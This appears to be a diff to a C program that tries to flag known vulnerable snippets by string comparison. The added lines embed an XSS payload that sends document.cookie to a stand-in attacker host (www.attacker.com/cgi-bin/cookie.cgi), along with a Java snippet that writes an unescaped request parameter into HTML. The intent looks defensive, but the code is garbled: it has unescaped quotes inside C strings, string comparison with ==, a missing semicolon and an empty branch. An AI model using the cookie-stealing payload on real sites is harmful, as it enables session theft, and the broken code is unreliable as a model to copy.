@@ -60,6 +60,14 @@ int main()
 		{
 			printf("You session has been leaked please check for this and this might cause probl;em later in coding.")
 		}
-		else if(word1 == "")
+		else if(word1 == "(String) page += "<input name='creditcard' type='TEXT'
+value='" + request.getParameter("CC") + "'>";" || word1 == "'><script>document.location=
+'http://www.attacker.com/cgi-bin/cookie.cgi?
+foo='+document.cookie</script>'")
+		{
+			printf("This code contains XSS vulnerability\n");
+		}
+		else if( word1 == "pstmt.setString(1, request.getParameter("acct"));
+ResultSet results = pstmt.executeQuery( );" || word1 == "")
 	}
 }
